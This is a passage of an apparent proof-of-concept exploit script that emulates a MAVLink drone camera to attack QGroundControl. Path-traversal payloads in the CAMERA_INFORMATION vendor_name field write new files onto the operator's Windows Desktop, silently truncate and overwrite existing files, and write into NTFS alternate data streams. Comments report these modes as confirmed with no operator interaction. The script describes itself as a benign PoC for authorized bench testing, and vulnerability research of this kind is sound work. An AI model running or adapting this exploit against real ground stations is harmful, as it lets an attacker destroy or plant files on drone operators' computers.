class CameraVehicle(FakeVehicle):
    """Adds a camera component: a second heartbeat stream on compid 100, and a
    CAMERA_INFORMATION responder that answers the request QGC addresses to it."""

    def __init__(self, *a, **kw):
        self.cam_compid = kw.pop("cam_compid", MAV_COMP_ID_CAMERA)
        self.cam_vendor = kw.pop("cam_vendor", "")
        self.cam_model = kw.pop("cam_model", "")
        self.cam_uri = kw.pop("cam_uri", "")
        self.cam_version = kw.pop("cam_version", 1)
        super().__init__(*a, **kw)
        self._cam_hb_thread = None
        self._cam_info_sent = 0

    # -- send as the camera component ---------------------------------------
    def _as_camera(self, fn, *a, **kw):
        """pymavlink stamps srcComponent at send time, so swap it around the call.

        Serialised against the other senders: the autopilot heartbeat thread, the
        camera heartbeat thread and the FTP replies all restamp the same field on
        one shared MAVLink object, so without a lock a concurrent send can be
        emitted under the wrong component id.
        """
        with self._send_lock:
            old = self.master.mav.srcComponent
            self.master.mav.srcComponent = self.cam_compid
            try:
                return fn(*a, **kw)
            finally:
                self.master.mav.srcComponent = old

    def start(self):
        super().start()
        self._cam_hb_thread = threading.Thread(target=self._camera_heartbeat_loop, daemon=True)
        self._cam_hb_thread.start()

    def _camera_heartbeat_loop(self):
        # MAV_TYPE_CAMERA on compid 100. This is what puts us into
        # _cameraInfoRequest and makes QGC ask for CAMERA_INFORMATION.
        while self._running:
            try:
                self._as_camera(
                    self.master.mav.heartbeat_send,
                    getattr(mavutil.mavlink, "MAV_TYPE_CAMERA", 30),
                    mavutil.mavlink.MAV_AUTOPILOT_INVALID,
                    base_mode=0, custom_mode=0,
                    system_status=mavutil.mavlink.MAV_STATE_ACTIVE)
            except Exception as e:
                if self.verbose:
                    warn("camera heartbeat failed: %s" % e)
            time.sleep(1.0)

    def send_camera_info_now(self):
        self._cam_info_sent += 1
        self._as_camera(self.send_camera_information,
                        vendor_name=self.cam_vendor,
                        model_name=self.cam_model,
                        cam_definition_uri=self.cam_uri,
                        cam_definition_version=self.cam_version)
        attack("sent CAMERA_INFORMATION #%d from compid %d"
               % (self._cam_info_sent, self.cam_compid))
        observe("  vendor_name = %r" % self.cam_vendor)
        observe("  model_name  = %r" % self.cam_model)
        observe("  uri         = %r" % self.cam_uri)

    # -- answer the request QGC addresses to the camera ---------------------
    def _rx_loop(self):
        # Wrap the base loop so we can also watch for the camera-info request.
        while self._running:
            try:
                msg = self.master.recv_match(blocking=True, timeout=0.5)
            except Exception:
                msg = None
                time.sleep(0.2)
            if msg is None:
                continue
            t = msg.get_type()
            if t == "BAD_DATA":
                continue

            if t == "FILE_TRANSFER_PROTOCOL":
                self._handle_ftp(msg)
                continue

            if t in ("COMMAND_LONG", "COMMAND_INT"):
                c = getattr(msg, "command", None)
                tgt = getattr(msg, "target_component", None)
                req_msg = int(getattr(msg, "param1", 0) or 0)
                REQ_MESSAGE = getattr(mavutil.mavlink, "MAV_CMD_REQUEST_MESSAGE", 512)
                REQ_CAMINFO = getattr(mavutil.mavlink, "MAV_CMD_REQUEST_CAMERA_INFORMATION", 521)
                CAMINFO_ID = getattr(mavutil.mavlink, "MAVLINK_MSG_ID_CAMERA_INFORMATION", 259)

                wants_caminfo = (c == REQ_CAMINFO) or (c == REQ_MESSAGE and req_msg == CAMINFO_ID)
                if wants_caminfo and tgt == self.cam_compid:
                    observe("QGC asked compid %d for CAMERA_INFORMATION (cmd=%s) -- answering"
                            % (self.cam_compid, c))
                    self._as_camera(self.master.mav.command_ack_send,
                                    c, mavutil.mavlink.MAV_RESULT_ACCEPTED)
                    self.send_camera_info_now()
                    continue

                if c == mavutil.mavlink.MAV_CMD_REQUEST_AUTOPILOT_CAPABILITIES:
                    self.send_autopilot_version()
                    self.master.mav.command_ack_send(c, mavutil.mavlink.MAV_RESULT_ACCEPTED)
                elif c == REQ_MESSAGE and req_msg == mavutil.mavlink.MAVLINK_MSG_ID_AUTOPILOT_VERSION:
                    self.send_autopilot_version()
                    self.master.mav.command_ack_send(c, mavutil.mavlink.MAV_RESULT_ACCEPTED)
                elif self.verbose:
                    observe("GCS sent %s command=%s target_comp=%s" % (t, c, tgt))
                continue

            if t == "MISSION_REQUEST_LIST":
                mt = getattr(msg, "mission_type", 0)
                try:
                    self.master.mav.mission_count_send(
                        msg.get_srcSystem(), msg.get_srcComponent(), 0, mt)
                except Exception:
                    pass
                continue

            if t == "PARAM_REQUEST_LIST":
                if self.verbose:
                    observe("GCS requested PARAM_REQUEST_LIST -- serving %d params"
                            % len(self.PARAMS))
                for i, (nm, val) in enumerate(self.PARAMS.items()):
                    self.send_param_value(nm, val, count=len(self.PARAMS), index=i)
                continue

            if t == "PARAM_REQUEST_READ":
                pn = getattr(msg, "param_id", "")
                if isinstance(pn, bytes):
                    pn = pn.decode("utf-8", "ignore")
                pn = pn.rstrip("\x00")
                if pn:
                    if pn not in self.PARAMS:
                        self.PARAMS[pn] = 0.0
                    idx = list(self.PARAMS.keys()).index(pn)
                    self.send_param_value(pn, self.PARAMS[pn],
                                          count=len(self.PARAMS), index=idx)
                continue

            if t == "AUTOPILOT_VERSION_REQUEST":
                self.send_autopilot_version()
                continue


# Windows: parameterSavePath() = %USERPROFILE%\Documents\QGroundControl\Parameters
# 3 x ../  ->  Parameters -> QGroundControl -> Documents -> %USERPROFILE%
MODES = {
    "traversal": dict(
        vendor="../../../Desktop/QGC01_PWNED",
        model="marker",
        note="write a NEW file onto the operator's Desktop, outside parameterSavePath()"),
    "overwrite": dict(
        vendor="../../../Desktop/QGC01-VICTIM",
        model="x",
        note="TRUNCATE + overwrite an existing file. Create "
             "%USERPROFILE%\\Desktop\\QGC01-VICTIM_x_001.xml with recognisable "
             "content first, then watch it be replaced. REQUIRES --http: the "
             "mftp:// branch is gated on !xmlFile.exists() and is skipped "
             "entirely when the target is already there, so only the HTTP "
             "path can reach the truncating write. CONFIRMED 2026-08-26 on "
             "QGC 5.1.3 / Windows 11: 'MISSION CONFIG - DO NOT LOSE' was "
             "replaced by the served definition XML with zero operator "
             "interaction"),
    "ads": dict(
        # MUST fit in the 32-byte uint8_t[32] wire field or the trailing ':' is
        # truncated off and the probe tests nothing. "../../../Desktop/T.txt:" is
        # 23 bytes, so the colon survives.
        vendor="../../../Desktop/T.txt:",
        model="s",
        note="write into an NTFS alternate data stream, escaping the forced .xml "
             "extension AND the !exists() gate (QFile::exists() tests the STREAM, "
             "not the host file). CONFIRMED 2026-08-26: stream '_s_001.xml' 234 "
             "bytes appeared on an existing Desktop\\T.txt whose :$DATA stayed "
             "intact. Target must be short enough that ':' survives the 32-byte "
             "wire field"),
}


def main():
    pre = argparse.ArgumentParser(add_help=False)
    pre.add_argument("--mode", choices=sorted(MODES), default="traversal")
    pre.add_argument("--vendor", help="override vendor_name (uint8[32])")
    pre.add_argument("--model", help="override model_name (uint8[32])")
    pre.add_argument("--cam-compid", type=int, default=MAV_COMP_ID_CAMERA,
                     help="camera component id, must be 100..105 for QGC to solicit "
                          "camera info (default 100). Use a FRESH id to re-test without "
                          "reconnecting -- infoReceived latches per component.")
    pre.add_argument("--http", metavar="HOST:PORT",
                     help="serve the definition XML over http://HOST:PORT/cam.xml instead "
                          "of mftp:// -- exercises the _cacheFile sink rather than the "
                          "FTPManager one")
    pre.add_argument("--version-byte", type=int, default=1,
                     help="cam_definition_version, becomes the %%03d in the filename")
    args, rest = pre.parse_known_args()

    m = MODES[args.mode]
    vendor = args.vendor if args.vendor is not None else m["vendor"]
    model = args.model if args.model is not None else m["model"]

    if args.http:
        cam_uri = "http://%s/cam.xml" % args.http
    else:
        cam_uri = "mftp://cam.xml"

    banner("QGC-01: CAMERA_INFORMATION vendor/model -> traversed file write")
    warn("BENIGN PoC. Authorized localhost/bench QGroundControl only. The XML we")
    warn("serve is an inert marker; only the PATH is hostile.")
    observe("mode=%s -- %s" % (args.mode, m["note"]))
    observe("vendor_name = %r  (%d of 32 bytes)" % (vendor, len(vendor.encode())))
    observe("model_name  = %r" % model)
    observe("cam_definition_uri = %r" % cam_uri)
    expect = "%s_%s_%03d.xml" % (vendor, model, args.version_byte)
    observe("QGC will build: parameterSavePath()/%s" % expect)
    if len(vendor.encode()) > 32:
        warn("vendor_name is %d bytes -- the wire field is uint8_t[32], so the tail"
             % len(vendor.encode()))
        warn("WILL be truncated. Shorten it or the test measures the wrong thing.")
        if args.mode == "ads":
            warn("Refusing to run the ADS probe with a truncated vendor_name: the")
            warn("trailing ':' would be cut off and the result would be meaningless.")
            return

    sys.argv = [sys.argv[0]] + rest
    base = FakeVehicle.from_cli("QGC-01 camera-info path traversal")
    v = CameraVehicle(base.conn_str, sysid=base.sysid, compid=base.compid,
                      verbose=base.verbose,
                      cam_compid=args.cam_compid, cam_vendor=vendor,
                      cam_model=model, cam_uri=cam_uri,
                      cam_version=args.version_byte)

    # Serve a real parameter set so QGC's initial connect completes. Without this
    # _initialConnectComplete stays false and the camera manager ignores every
    # message we send (see build_param_pck docstring).
    pck = build_param_pck()
    v.add_ftp_file("@PARAM/param.pck", pck)
    observe("serving @PARAM/param.pck (%d bytes) so the initial connect completes" % len(pck))

    if not args.http:
        v.add_ftp_file("cam.xml", BENIGN_CAM_DEF_XML)
        v.add_ftp_dir_entry("cam.xml", size=len(BENIGN_CAM_DEF_XML), is_dir=False)
        observe("serving the definition XML over MAVFTP as 'cam.xml' (%d bytes)"
                % len(BENIGN_CAM_DEF_XML))
    else:
        # No HTTP server is embedded here on purpose -- the interesting half of
        # this PoC is the MAVLink side, and a stock one-liner serves the XML
        # perfectly well. Write it out so `python3 -m http.server` just works.
        xml_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cam.xml")
        with open(xml_path, "wb") as fh:
            fh.write(BENIGN_CAM_DEF_XML)
        _host, _, _port = args.http.partition(":")
        _port = int(_port or 80)
        observe("wrote %s (%d bytes)" % (xml_path, len(BENIGN_CAM_DEF_XML)))
        observe("serve it in another terminal, from this directory:")
        observe("    python3 -m http.server %d" % _port)
        observe("advertising cam_definition_uri = %s" % cam_uri)
        observe("this exercises the _cacheFile sink (VehicleCameraControl.cc:929-936,")
        observe("QIODevice::WriteOnly == TRUNCATE) rather than the FTPManager sink.")
        observe("The mftp:// path is create-only: it is gated on !xmlFile.exists().")

    v.start()
    attack("Camera component %d heartbeating at 1 Hz." % args.cam_compid)
    attack("In QGC: add a TCP link to this host:5760 and CONNECT. Then wait --")
    attack("QGC solicits CAMERA_INFORMATION by itself; there is nothing to click.")
    observe("If QGC logs 'Ignoring - Camera info not requested', the camera compid is")
    observe("outside 100..105 or the initial connect had not completed yet.")
    v.serve_forever()


if __name__ == "__main__":
    main()
